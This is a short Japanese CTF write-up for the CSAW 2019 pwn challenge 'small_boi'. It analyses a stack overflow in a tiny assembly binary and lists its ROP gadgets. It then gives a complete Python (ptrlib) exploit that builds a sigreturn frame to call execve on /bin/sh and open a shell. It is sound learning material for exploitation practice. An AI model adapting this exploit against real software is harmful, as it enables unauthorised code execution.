# [pwn 100pts] small_boi - CSAW CTF Qualification 2019
64ビットバイナリで、DEP以外無効です。
```
$ checksec -f small_boi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       small_boi
```
IDAで解析すると、アセンブリで書かれた小さいバイナリだと分かります。readで0x200バイト読んでいるのですが、0x20バイトしか確保されていないのでBOFになります。
さて、ROP gadgetを探すと次のように少ししかありません。
```
0x00400183: add byte [rax], al ; syscall  ;  (3 found)
0x00400237: add byte [rdi+rdi*8-0x01], dl ; jmp qword [rcx] ;  (1 found)
0x00400186: add eax, 0x58C35D90 ; ret  ;  (1 found)
0x0040019c: dec dword [rax-0x39] ; retn 0x0200 ;  (1 found)
0x0040023b: jmp qword [rcx] ;  (1 found)
0x00400180: mov eax, 0x0000000F ; syscall  ;  (1 found)
0x004001bf: mov eax, 0x0000003C ; syscall  ;  (1 found)
0x0040019e: mov edx, 0x00000200 ; syscall  ;  (1 found)
0x004001be: mov rax, 0x000000000000003C ; syscall  ;  (1 found)
0x0040019d: mov rdx, 0x0000000000000200 ; syscall  ;  (1 found)
0x0040018a: pop rax ; ret  ;  (1 found)
0x00400188: pop rbp ; ret  ;  (3 found)
0x00400189: ret  ;  (4 found)
0x0040019f: retn 0x0200 ;  (1 found)
0x00400174: retn 0x5462 ;  (1 found)
0x0040016f: shr byte [rdx+rcx*2+0x68], 0xFFFFFF96 ; retn 0x5462 ;  (1 found)
0x00400185: syscall  ;  (3 found)
0x00400173: xchg eax, esi ; retn 0x5462 ;  (1 found)
```
とりあえず`pop rax`があるので任意のシステムコールが呼べます。ただし、rdi, rsi, rdxを設定するgadgetが存在しません。こういうときはSROPを使いましょう。
とりあえず/bin/shを書き込むためにvuln関数の途中を呼ぼうと思ったのですが、バイナリ中に/bin/shがありました。

```python
from ptrlib import *

sock = Process("./small_boi")
rop_pop_rax = 0x0040018a
rop_syscall_pop = 0x4001c5
addr_target = 0x601800

payload = b'A' * 0x28
payload += p64(rop_pop_rax)
payload += p64(15)
payload += p64(rop_syscall_pop)
payload += p64(0) * 5
payload += p64(0) * 8 # r8 - r15
payload += p64(0x400000 + 0x1ca) # rdi
payload += p64(0) # rsi
payload += p64(0) # rbp
payload += p64(0) # rbc
payload += p64(0) # rdx
payload += p64(59) # rax
payload += p64(0) # rcx
payload += p64(0x601800) # rsp
payload += p64(rop_syscall_pop) # rip
payload += p64(0) # eflags
payload += p64(0x33) # csgsfs
payload += p64(0) * 4
payload += p64(0) # fpstate
#payload += b'\x00' * (0x200 - len(payload))

assert len(payload) <= 0x200
sock.send(payload)

sock.interactive()
```

# 感想
SROPってこういうバイナリで使うんですね。勉強になりました。
